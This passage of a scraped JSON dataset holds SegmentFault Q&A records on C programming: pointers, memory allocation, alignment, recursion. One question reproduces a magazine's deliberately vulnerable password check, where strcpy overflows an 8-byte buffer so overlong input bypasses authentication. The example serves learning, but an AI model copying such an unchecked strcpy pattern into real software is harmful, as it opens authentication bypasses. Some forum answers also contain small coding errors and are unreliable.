      "dsc": "<div class=\"question fmt\" data-id=\"1010000002778572\">\n<pre><code>#include &lt;stdio.h&gt;\nint main()  \n{      \n    char str[80];\n    printf(\"Enter the string:\");\n    scanf(\"%s\", &amp;str[0]);\n    printf(\"%d\", &amp;str[0]);\n    printf(\"%d\", &amp;str);\n    printf(\"%d\", str);\n    printf(\"You entered:%s\\n\",str);\n    return 0;\n}\n</code></pre>\n<p>输出<br>\nEnter the string:-1081426336-1081426336-1081426336You entered:wefwq</br></p>\n<p>str和&amp;str[0]可以理解，但是为什么str和&amp;str效果是一样的呢？</p>\n</div>",
      "favourite": "1",
      "glance": "924",
      "tags": [
        "c"
      ],
      "time": "2015-05-19",
      "title": "C语言数组取地址",
      "url": "https://segmentfault.com/q/1010000002778572"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002913131\">\n<blockquote>\n<p><code>a = b ?: c</code> 是 <code>a = b ? b : c</code> 的简写。</p>\n</blockquote>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002912761\">\n<pre><code>b = true\nc = false\na = b ?: c  // a = true\n\nb = false\nc = true\na = b ?: c // a = true\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002913115\">\n<p>帮你搜索了一下，见<a href=\"http://stackoverflow.com/questions/8760561/is-this-ternary-conditional-correct-objective-c-syntax\" rel=\"nofollow\">StackOverflow</a></p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002912729\">\n<p><strong>注意：我很清楚   a = b ? c : d 是什么意思，可这不是我要问的问题。</strong></p>\n<p>三元运算符 a = b ?: c 是什么意思。注意， ?和: 是在一起的</p>\n</div>",
      "favourite": "0",
      "glance": "876",
      "tags": [
        "c",
        "c++",
        "objective-c"
      ],
      "time": "2015-06-17",
      "title": "三元运算符 a = b ?: c 是什么意思",
      "url": "https://segmentfault.com/q/1010000002912729"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002923263\">\n<p>这是我想当然写的代码，实际发现根本不行(在在新问答提交居然测试通过了，但是本地跑测试不行，难道是我 main 函数里面初始做得不对？).</p>\n<pre><code>struct TreeNode {\n    int val;\n    struct TreeNode* left;\n    struct TreeNode* right;\n};\n\nstruct TreeNode* invertTree(struct TreeNode* node){\n    if(node == NULL){\n        return node;\n    }\n    struct TreeNode* tmp = node-&gt;left;\n    node-&gt;left = invertTree(node-&gt;right);\n    node-&gt;right = invertTree(tmp);\n    return node;\n}\nint main(){\n    //        4\n    //      /   \\\n    //     2     7\n    //    / \\   / \\\n    //   1   3 6   9\n\n    struct TreeNode rootNode;\n    struct TreeNode leftNode;\n    struct TreeNode rightNode;\n\n    struct TreeNode leftNode1;\n    struct TreeNode leftNode2;\n\n    struct TreeNode rightNode1;\n    struct TreeNode rightNode2;\n\n\n    leftNode1.val = 1;\n    leftNode1.left = NULL;\n    leftNode1.right = NULL;\n\n    leftNode2.val = 3;\n    leftNode2.left = NULL;\n    leftNode2.right = NULL;\n\n    leftNode.val = 2;\n    leftNode.left = &amp;leftNode1;\n    leftNode.right = &amp;leftNode2;\n\n    rightNode1.val = 6;\n    rightNode1.left = NULL;\n    rightNode1.right = NULL;\n\n    rightNode2.val = 9;\n    rightNode2.left = NULL;\n    rightNode2.right = NULL;\n\n    rightNode.val = 7;\n    rightNode2.left = &amp;rightNode1;\n    rightNode2.right = &amp;rightNode2;\n\n    rootNode.val = 4;\n    rootNode.left = &amp;leftNode;\n    rootNode.right = &amp;rightNode;\n\n    invertTree(&amp;rootNode);\n}\n</code></pre>\n<p>编译能通过，执行就提示<code>Segmentation fault: 11</code></p>\n</div>",
      "favourite": "4",
      "glance": "2.8k",
      "tags": [
        "c"
      ],
      "time": "2015-06-21",
      "title": "关于最近比较火的二叉树翻转的问题",
      "url": "https://segmentfault.com/q/1010000002923263"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002963205\">\n<p>请参考一下这个<a href=\"http://segmentfault.com/q/1010000002922477/a-1020000002924594\" rel=\"nofollow\">C/C++如何发送包含包体长度和结构体的socket包</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002971099\">\n<p>为什么要涉及到内存对齐呐？如果你想知道某个类型占用内存的大小，最好就用sizeof.关于内存对齐，不同的平台对齐模数不一样，内存布局也就不一样。不过有个 #pragma pack(对齐模数）预处理指令，可以用来控制。修改了对齐模数，可能会影响CPU读取内存的速度。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002973635\">\n<p>根本不用考虑这个问题吧？只要你的算法能兼容不同的对齐策略就可以了。至于不同平台之间的差异，设计网络通讯协议需要考虑，而像内存池这种本地代码的话根本不必考虑，因为不可能在这台机器上申请内存给另一台机器用啊。</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002963164\">\n<p>想实现一个跨平台的HEAP或者内存池之类的东西，分配的内存大小是不固定的。<br>\n在win32下，HeapAlloc返回的地址总是8的整数倍；在win64下，HeapAlloc返回的地址总是16的整数倍。这个究竟是不是全平台通用的规则还是特例？<br>\nLua源代码里，通过共同体“L_Umaxalign”来实现数据对齐，但是这个最多保证8字节对齐。我想在L_Umaxalign里加入long double实现16字节对齐，但是VC下long double还是8字节的，且在有些编译器下long double是12字节。仍然做不到16字节对齐。<br>\n查了一下，貌似win64下heap数据16字节对齐是为某些SSE指令，如果不考虑这个问题，64位平台下8字节对齐是不是也没关系？</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-07-06",
      "title": "跨平台时如何保证字节对齐",
      "url": "https://segmentfault.com/q/1010000002963164"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002965551\">\n<html><body>\n<p>看了黑防杂志的一段栈溢出漏洞代码，很简单的原理，输入长度大于8的密码后，由于原定义数组长度为8，因此溢出至返回值：</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#define PASSWORD \"1234567\"\nint verify_password(char* password)\n{\n    int authenticated;\n    char buffer[8];//定义一个大小为8字节的数组，控制没溢出的字符串长度，（超出这个长度就会溢出）\n    authenticated = strcmp(password,PASSWORD);\n    strcpy(buffer,password);//这句话直接导致溢出的发生\n    return authenticated;\n} \nint main()\n{\n    int valid_flag = 0;\n    char password[1024];\n    while(1)\n    {\n            printf(\"请输入密码：\");\n            scanf(\"%s\",password);\n            valid_flag = verify_password(password);\n\n            if(valid_flag)\n            {\n                          printf(\"密码错误。请重试\\n\\n\\n\");\n            }        \n            else\n            {\n                          printf(\"验证通过:)\");\n                          break;\n            }\n\n    }\n    system(\"pause\");\n    return 0;\n}\n</code></pre>\n<p>理论上的运行结果是输入长度为8的字符串后，就会溢出，密码直接验证通过：</p>\n<p><img data-src=\"/img/bVmBDp\"/></p>\n<p><img data-src=\"/img/bVmBS5\"/></p>\n<p>但是我实际的运行结果是这样的：</p>\n<p><img data-src=\"/img/bVmBDt\"/></p>\n<p>我输入了12个长度的字符后才溢出，输入8个字符长度不会溢出。</p>\n<p>然后我输出了栈内的两个地址，发现相差12.。为啥不是相差8.。。</p>\n<p><img data-src=\"/img/bVmBDw\"/></p>\n<p>---------------------------------更深的困惑----------------------------<br>\n同学用她的MAC运行我的代码 ，输入8个字节密码成功验证，但是我在另一台windows7<br>\n上运行依旧是12个字节密码才成功。</br></br></p>\n<p>若能指点一二，万分感激。</p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "755",
      "tags": [
        "windows",
        "windows-7",
        "c",
        "漏洞",
        "栈"
      ],
      "time": "2015-07-06",
      "title": "简单栈溢出漏洞问题求解（黑防2015第4期）",
      "url": "https://segmentfault.com/q/1010000002965551"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003009538\">\n<p>C语言看看goahead吧。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003011764\">\n<p>Tornado和Flask读一下都非常不错。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003011839\">\n<p>推荐读nginx 读完你会感觉自己变了一个人</p>\n</div>",
      "attention": "13",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003004653\">\n<p>比如nginx、tornado这种？</p>\n<p>我觉得nginx会不会比较复杂，有没有上手简单一点的？</p>\n</div>",
      "favourite": "5",
      "glance": "1.4k",
      "tags": [
        "c",
        "c++",
        "python",
        "server"
      ],
      "time": "2015-07-20",
      "title": "c/c++/python有什么值得阅读的web服务器代码",
      "url": "https://segmentfault.com/q/1010000003004653"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003013000\">\n<p>我的c程序返回值不只一个，所以我用了一个结构体来保存这些值，调用c程序，返回一个结构体<br>\n但是python中没有合适的变量来接收结构体。（我刚刚接触python，很多地方都不会）<br>\n对此，各位大神有没有好的建议？<br>\n我有两个想法：<br>\n1、c中用二维数组来存储我需要的这些值，python用序列元组来接收它们，序列中的每个元组就是我需要的值，但是不知道这样可不可行<br>\n2、用域套接字来完成c向python传数据，这样的话就需要server和client一个用python写，一个用c写，这样可行吗？<br>\n还有其他什么解决方案吗？<br>\n刚工作不久，对python特别不熟悉，希望各位可以指导一下，谢谢大家了</br></br></br></br></br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "888",
      "tags": [
        "python",
        "c"
      ],
      "time": "2015-07-23",
      "title": "python 调用 C 程序",
      "url": "https://segmentfault.com/q/1010000003013000"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003043071\">\n<p>我们用Thrift</p>\n<p><a href=\"http://thrift.apache.org/\" rel=\"nofollow\">http://thrift.apache.org/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003043002\">\n<p>基本都是各个模块做成服务的形式，然后相互调用。不会涉及到语言层面。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003044040\">\n<p>现在的后台架构都不限于用某种语言，分布式、大数据处理基本上是java,较好的http服务器如Nginx用c编写，能处理并发请求数比其他的引擎都多，缓存系统可以选用memcache、Redis等，他们都是用c编写的，至于各个模块的交互都是通过协议通信，所以不会存在语言的界限。一般来说php不会配合Java使用。做网站后台的话起码要会java,php,C#其中一种语言。不知道你问的是前端还是后台，以上说的都是后台。前端就比较通用了，html,js,css都要。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003042988\">\n<p>大型网站，PHP一般与Java配合使用，还是和c/c++配合使用？</p>\n</div>",
      "favourite": "0",
      "glance": "826",
      "tags": [
        "c++",
        "java",
        "c"
      ],
      "time": "2015-08-02",
      "title": "Java or c/c++ 与PHP配合使用",
      "url": "https://segmentfault.com/q/1010000003042988"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003021450\">\n<p>这个问题问的好，接下来我们一起疤丁解牛,把简单的事情说复杂看看是什么样子</p>\n<p>先剖析下for的执行顺序，<br><code>for(A;B;C){D}</code><br>\n1. 进入循执<br>\n2. 首先是根据A，初始化，<br>\n3. 判断B,是否满足，如果满足进入D<br>\n4. 循环结束后，执行C,<br>\n5. 执行C后跳转到3 ，继续3-4-5-3-4-5的循环 直到满足C不满足。</br></br></br></br></br></br></p>\n<p>实际上程序执行过程是<code>A-(B-D-C)-(B-D-C)-(B-D-C)...-B</code> 的过程。</p>\n<p>你感官觉得结果应该不同的，但输出为什么都一样呢，在看i++和++i</p>\n<p>先看这句</p>\n<pre><code>a++;\n</code></pre>\n<p>其实就是等价于下面2句</p>\n<pre><code>a=a（这就就是废话）\na=a+1（结果a增加了1）\n</code></pre>\n<p>然后看这句</p>\n<pre><code>++b;\n</code></pre>\n<p>其实就是等价于下面</p>\n<pre><code>b=b+1;（b增加1）\nb=b;（b还是那个增加了1的b）\n</code></pre>\n<p>可见执行完后都是plus1了，<br>\n因此这种差别只有在有赋值的情况，如下：<br>\nj=i++（等价于j=i;i=i+1）<br>\nj=++i (等价于i=i+1;j=i)也即(j=i+1)</br></br></br></p>\n<p>因此对J才有区别，对i都是加了1的。<br>\n因此你的循环的结果相同的就好容易理解了吧。<br>\n那么，尽管我说了这么多，可能人的自觉感觉结果应该不同的才感觉合理啊，如果要出现你感官上那种不同，改为以下即可。</br></br></p>\n<pre><code>i=0;\nj=0\nfor (var j = 0; j &lt; 10; j) {\n        console.log(\"循环\"+j);\nj=i++;\n    }\n   console.log(\"循环后i等于\"+i)\n   console.log(\"循环后j等于\"+j)\n\n</code></pre>\n<hr>\n<pre><code>i=0\nj=0\nfor (var j = 0; j &lt; 10; j) {\n        console.log(\"循环\"+j);\nj=++i;\n    }\n   console.log(\"循环后i等于\"+i)\n   console.log(\"循环后j等于\"+j)\n</code></pre>\n<p><img data-src=\"/img/bVmQaQ\"/></p>\n<h1>废话这么多，就是一句话，没有赋值的时候，i++和++i都是让i加1，是等价的。</h1>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003022922\">\n<p>如果非要纠结那一点效率的话++i的效率要高于i++那么一丢丢(未编译的情况下)<br>\n原因上面也有人提到，i++会使用当前值后在+1，这时会有一个临时变量的出现存储+1后的值。而++i则直接进行+1，不会出现临时变量。所以......</br></p>\n<p>我只是从效率上考虑而已。其他的一些推荐写法看个人爱好。不过效率真心影响不大。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003021372\">\n<p>要知道for循环的三个表达式相当于三段式的while。 第三个表达式是在每次循环结束后执行，所以无论是先加还是后加，在语句结束后都已经自增完了。</p>\n<p>通常使用先加要优于后加，因为通常意义来讲，后加是会产生一个临时变量。但对于c++等编译语言，后加是会被优化的。至于在PHP具体怎么优化，不是很了解。</p>\n<p>使用前加是一个很好的编程习惯。</p>\n</div>",
      "attention": "30",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003021258\">\n<p>补充3：<br>\n谢谢大家的热情回答～！<br>\n通过<code>md5ryan</code>与<code>2bdenny</code>l两位以及<code>之前多位</code>的回答，已经可以给在C中这两者的效率问题盖棺定论了。<br>\n在早些时候应该是前置递增比较的有效率，而在<code>现代</code>两者已经<code>没有区别</code>了。<br>\n不过LZ其实想问的是在<code>JS</code>中这两者的效率有米差别囧。。。。。。</br></br></br></br></p>\n<p>在C中可以通过查看其汇编后的代码来分析两者有没有差别，不过在像JS这种解释性语言要怎么分析这种类型的问题呢？？<br>\n想了想大致可以分为两种方法吧：<br>\n1、实验法，就是分别写一段代码，测试时间<br>\n2、分析其引擎实现，像JS的话就是指的是V8</br></br></br></p>\n<p>第一种方法简单易实现，不过还是从表面观察，有种雾里看花的感觉<br>\n第二种方法很难，因为这是要去掌握规则，不过一旦掌握了，按照一般奇幻小说里的等级构架那就是传奇法师级别的了吧～～</br></p>\n<p>我辈的追求大概就是不断的去寻求真理吧！<br>\n所以<code>问题更新</code>了～<br>\n在<code>V8</code>环境下，++i与i++ 的具体实现过程</br></br></p>\n<p>LZ能力有限，在这提供给大家V8在GitHub上的源码镜像<a href=\"https://github.com/v8/v8\" rel=\"nofollow\">https://github.com/v8/v8</a></p>\n<p><code>原问题</code>：<br>\nfor (var i = 0; i &lt; N ; ++i)中 ++i 而不是 i++ ，是不是只是习惯的上的区别？？</br></p>\n<hr>\n<p>补充2：<br>\n首先！<br>\n我真的<code>不是</code>在问前置递增与后置递增的区别！！，汗。<br>\n注意下上下文，是在<code>for这表达式</code>中这两者有没有区别！！！<br>\n比如<code>效率</code>上两者有没有差距，等</br></br></br></br></p>\n<hr>\n<p>明白i++与++i的区别，但在for循环应用中有点迷惑。</p>\n<pre><code><br>    for (var i = 0; i &lt; 10; i++) {\n        print(i);\n    }\n\n\n    for (var i = 0; i &lt; 10; ++i) {\n        print(i);\n    }\n\n\n</br></code></pre>\n<p>输出的都一样：0~9</p>\n<hr>\n<p>补充1：<br>\n额，好像大家有点理解错我的意思了。。。<br>\n被踩那么多，好郁闷啊。。。。<br>\n今天看书的时候，看到作者是这样写的</br></br></br></p>\n<pre><code>for (var i = 0; i &lt; this.dataStore.length; ++i)\n</code></pre>\n<p>但平时自己习惯是写<code>i++</code>的，后来查了下书，这应该等价于</p>\n<pre><code>var i = 0\nwhile (i &lt; this.dataStore.length){\n    code\n    ++i\n}\n</code></pre>\n<p>和</p>\n<pre><code>var i = 0\nwhile (i &lt; this.dataStore.length){\n    code\n    i++\n}\n</code></pre>\n<p>这样不管是先运算i,还是后运算i的值，最后都是一样的吧。因为已经不会影响到code里的代码了。<br>\n所以这样<code>for (var i = 0; i &lt; this.dataStore.length; ++i)</code>中 <code>++i</code> 的写法只是习惯问题吧？？<br>\n或者会有其他什么影响吗？？<br>\n我想问的是这个，可能有些人理解为我问<code>++i</code>与<code>i++</code>的区别的吧，囧。</br></br></br></p>\n</hr></hr></hr></div>",
      "favourite": "12",
      "glance": "3.7k",
      "tags": [
        "javascript",
        "c",
        "v8",
        "c++"
      ],
      "time": "2015-07-26",
      "title": "在V8环境下，++i与i++ 的具体实现过程",
      "url": "https://segmentfault.com/q/1010000003021258"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003087791\">\n<p>在做一个leetcode的题，遇到了一个奇怪的问题，调用realloc为array扩容，报错</p>\n<blockquote>\n<p>malloc: error for object 0x7f7fc0404bf0: pointer being realloc'd was not allocated</p>\n</blockquote>\n<p>在下面的代码中，第一次realloc的时候是ok的，第二次调用到realloc的时候就会报错了</p>\n<p>请问如何修改可以解决，以及为什么</p>\n<pre><code>#include \"stdio.h\"\n#include \"stdlib.h\"\n#include \"string.h\"\n\nvoid generate(int left, int right, int currentLen, char* str, char** result, int* resultCount, int* resultCapacity) {\n    if (right &lt; left) {\n        return;\n    }\n    if (left == 0 &amp;&amp; right == 0) {\n        char* temp = malloc(sizeof(char) * (currentLen + 1));\n        temp = strcpy(temp, str);\n        result[*resultCount] = temp;\n        (*resultCount)++;\n    }\n    if (*resultCount &gt;= *resultCapacity) {\n        *resultCapacity = (*resultCapacity) * 2;\n        char** temp = realloc(result, sizeof(char*) * (*resultCapacity));\n        result = temp;\n    }\n    if (left &gt; 0)  {\n        str[currentLen] = '(';\n        str[currentLen + 1] = '\\0';\n        generate(left - 1, right, currentLen + 1, str, result, resultCount, resultCapacity);\n    }\n    if (right &gt; 0) {\n        str[currentLen] = ')';\n        str[currentLen + 1] = '\\0';\n        generate(left, right - 1, currentLen + 1, str, result, resultCount, resultCapacity);\n    }\n}\n\nchar** generateParenthesis(int n, int* returnSize) {\n    if (n &lt; 1) {\n        return NULL;\n    }\n    int* resultCount = malloc(sizeof(int));\n    int* resultCapacity = malloc(sizeof(int));\n    (*resultCount) = 0;\n    (*resultCapacity) = n;\n    char** result = malloc(sizeof(char*) * (*resultCapacity));\n    char* str = malloc(sizeof(char) * (n * 2 + 1));\n    generate(n, n, 0, str, result, resultCount, resultCapacity);\n    *returnSize = *resultCount;\n    return result;\n}\n\nint main(int argc, char const *argv[]) {\n    int* returnSize = malloc(sizeof(int));\n    char** result = generateParenthesis(5, returnSize);\n    for (int i = 0; i &lt; *returnSize; ++i) {\n        printf(\"%s\\n\", result[i]);\n    }\n    return 0;\n}\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "498",
      "tags": [
        "c"
      ],
      "time": "2015-08-12",
      "title": "realloc：pointer being realloc'd was not allocated",
      "url": "https://segmentfault.com/q/1010000003087791"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003504791\">\n<p>给楼主一个方法，我测试出来的，如果报错请根据环境调试</p>\n<pre><code>int a[5][6];\nint length=((int)&amp;a)+1-(int)&amp;a;</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003482330\">\n<p>因你是写java的，我只能从简解释：<br>简单方法：C语言可修改函数参数所指的值，可以通过函数参数返回二维数组的行数和列数。<br>第二种方法：定义一个结构体，存放二维数组的指针，行数和列数，getInfo分配这个结构，赋值，并返回此结构的指针。</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003486136\">\n<p>比如，用点黑魔法之类的（C语言的黑魔法当然就是宏+指针）。之前就有人提出将一个数组的长度记在首地址前。</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct array_meta_t {\n    int length;\n    int elem_size;\n} array_meta;\n\n#define TO_META(array) (((array_meta*)array) - 1)\n#define TO_ARRAY(meta) ((void*)(meta + 1))\n\nvoid* array_allocate(int length, int type_size)\n{\n    array_meta* new_array = malloc(length * type_size + sizeof(array_meta));\n    new_array-&gt;length = length;\n    new_array-&gt;elem_size = type_size;\n\n    return TO_ARRAY(new_array);\n}\n\n#define array_length(array) (TO_META(array)-&gt;length)\n#define array_type_size(array) (TO_META(array)-&gt;elem_size)\n#define array_create(type, length) ((type*)array_allocate(length, sizeof(type)))\n#define array_release(array) (free(TO_META(array)))\n\nint** return_some_array()\n{\n    int** my_array = array_create(int*, 10);\n\n    int value = 0;\n\n    for(int i = 0; i &lt; array_length(my_array); i++)\n        my_array[i] = array_create(int, 20);\n        \n    return my_array;\n}\n\nint main()\n{\n    int** result = return_some_array();\n    printf(\"The array has size %dx%d\\n\",\n        array_length(result),\n        array_length(*result));\n    // Output: The array has size 10x20\n\n    for(int i = 0; i &lt; array_length(result); i++)\n        array_release(result[i]);\n    array_release(result);\n}\n</code></pre>\n<p>这种方法相比起返回一个结构体指针有三个好处：</p>\n<ul>\n<li><p>元信息结构体对用户是隐藏的（有点像面向对象里的私有域），这里array_length是宏所以可写，改写成函数就是只读了</p></li>\n<li><p>可以用传统的<code>[]</code>操作符直接取偏移，而不需要先解引用之类的</p></li>\n<li><p>还有一个就是，如果返回一个结构体，相当于要动态分配两次，内存管理起来更加麻烦。这里只需要<code>malloc</code>一次，然后释放一次就好了。</p></li>\n</ul>\n<p>C++的话就不用费事用vector了，用两个模板元把不同长度的数组重载开，搞定。记得参数是引用：</p>\n<pre><code>template&lt;int M, int N&gt;\nvoid print_length(int (&amp;) [M][N]) {\n    cout &lt;&lt; M &lt;&lt; ' ' &lt;&lt; N &lt;&lt; endl;\n}\n//...\nint arr[5][6];\nprint_length(arr); // Output: 5 6</code></pre>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003481040\">\n<pre><code>    public int[][] getInfo() {\n        int[][] result = new int[10][20];\n        return result;\n    }\n    public void main() {\n        int[][] result = getInfo();\n        System.out.println(\"结果长度：\" + result.length);\n        for (int i = 0; i &lt; result.length; i++) {\n            for (int j = 0; j &lt; result.length; j++) {\n                System.out.println(result[i][j]);\n            }\n        }\n    }</code></pre>\n<p>上面是一段java的代码，功能就是获取返回的二维数组，并输出二维数组的大小，并遍历数组的内容，前提是我并不知道返回来得数组大小。<br>如何把它翻译成C语言？其实我就是想理解C语言如何返回二维数组，如何获取数组的大小。</br></p>\n</div>",
      "favourite": "3",
      "glance": "2.5k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-08-23",
      "title": "C语言的函数如何返回二维数组，并获取返回的二维数组大小",
      "url": "https://segmentfault.com/q/1010000003481040"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003486155\">\n<pre><code>int F(int a){\n    return (a &lt; 2 ) ? a : (F(a - 1) + F(a - 2));\n}</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003691859\">\n<p>一个递推式活生生的变成了递归。。<br>这得浪费多少时间</br></p>\n<pre><code>f[i] = f[i-1] + f[i-1];</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003484853\">\n<pre><code>#include &lt;stdio.h&gt;\n\nint F(int a) {\n    if (a == 0 || a == 1)\n        return a;\n    return F(a - 1) + F(a - 2);\n}\n\nint main() {\n    int N;\n    scanf(\"%d\", &amp;N);\n    if (N &lt; 0) {\n        printf(\"Input less than 0. Exit\\n\");\n        return -1;\n    }\n    printf(\"%d\", F(N));\n    return 0;\n}</code></pre>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003481227\">\n<pre><code>#include&lt;stdio.h&gt;\nint F(int a){\n    if (a==1){\n        return 1;\n    }\n    else if (a==0){\n        return 0;\n    }\n    else{\n        return F(a-1)+F(a-2);\n    }     \n}\nint sum(int b){\n    return F(max-1)+F(max-2);\n}\nint main(){\n    int N;\n    scanf(\"%d\",&amp;N);\n    printf(\"%d\",sum(N));\n    return 0;    \n}</code></pre>\n</div>",
      "favourite": "0",
      "glance": "478",
      "tags": [
        "c"
      ],
      "time": "2015-08-23",
      "title": "求大神指导如何所小这个斐波那契数列程序的大小 ",
      "url": "https://segmentfault.com/q/1010000003481227"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003488762\">\n<p>int <em>p[4]的理解是p[4]里面保存4个 int </em>，你理解错了</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003488829\">\n<p>数组名作为形参, 会\"退化\"为指向数组首元素指针. </p>\n<p>所以<code>int fun(int *p[4])</code>, 参数p为 <code>(int*)的数组</code>, 转换为 <code>指向数组首元素的指针</code>, 也就是指向 <code>int*</code> 的指针, =&gt; <code>int fun(int **p)</code></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003488799\">\n<p>先判断变量的数据类型,如下:</p>\n<p>A. a4 is an int<br>B. a is a pointer to pointer to int<br>C. a is array of 4 pointers to pointer to int<br>D. a is a pointer to array of 4 ints</br></br></br></p>\n<p><code>p</code> is array of 4 pointers to int</p>\n<p>知道了数据类型,就可以进行分析了:</p>\n<p><code>p</code>是一个包含4个int*的数组,这样就可以排除A选项了.因为在C语言中,数组和指针有着微妙的关系,<strong>数组名的数据类型是指向数组第一个元素的指针</strong>,这样的话,<code>p</code>又可以解释成:<code>p</code> is a pointer to pointer to int,也就是<code>int**</code>,同理,C选项中的<code>a</code>可以解释成:<code>a</code> is a pointer to pointer to pointer to int,<br>也就是<code>int***</code>,不符合.而在D选项中,<code>a</code>虽然是一个指针,但是指向的是一个数组,不符合.所以最后的答案就是B!</br></p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003488714\">\n<p>函数fun的声明int fun(int *p[4]),以下哪个变量可以作为fun的合法参数<br>A:int a4<br>B:int **a<br>C:int **a[4]<br>D:int (*a)[4]</br></br></br></br></p>\n<p>我得理解：int *p[4] 为p是指向数组的指针，数组元素为int<br>所以函数参数要是指向数组的指针，A不符合要求，然后D是指针数组，数组元素个数为4也不符合，那么B C分别代表什么意思呢？</br></p>\n</div>",
      "favourite": "2",
      "glance": "842",
      "tags": [
        "c"
      ],
      "time": "2015-08-25",
      "title": "c语言int *p[4]和int (*p)[4]问题",
      "url": "https://segmentfault.com/q/1010000003488714"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003697040\">\n<p>这样一段代码</p>\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\n    int *p;\n    p = NULL;\n    free(p);\n    printf(\"test\\n\");\n    return 0;\n}</code></pre>\n<p>最后可以使用gcc编译成功并且输出结果是：</p>\n<blockquote><p>test</p></blockquote>\n<p>为什么free一个空指针没有报错，反而可以顺利运行到输出语句？</p>\n</div>",
      "favourite": "1",
      "glance": "955",
      "tags": [
        "c",
        "指针"
      ],
      "time": "2015-09-02",
      "title": "C的free的参数是空指针的问题",
      "url": "https://segmentfault.com/q/1010000003697040"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003710381\">\n<p>在栈上分配内存只需增加栈指针即可，函数返回后内存自然被释放。<br>而在堆上分配内存需要管理分配出的每一块内存块（一般是 glibc 管理的），分配时还需要寻找合适大小的内存块，开销自然大了不少。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003718253\">\n<p>建议把问题的表述修改一下好一点，所谓的“动态内存”应该改为在堆（heap）区分配的内存，所谓的“堆栈内存”直接改为栈（stack）区分配的内存。虽然一般说的堆栈段内存，其实就是指栈（stack）内存，把“堆”和“栈”分开，这样看起来才更有针对性。</p>\n<p>有关“堆栈”的区别，以及相关内存分配的时期、结构的不同，可以参考：<br><a href=\"http://www.cnblogs.com/fbwfbi/archive/2013/06/16/3138902.html\">http://www.cnblogs.com/fbwfbi/archive/2013/06/16/3138902.html</a></br></p>\n</div>",
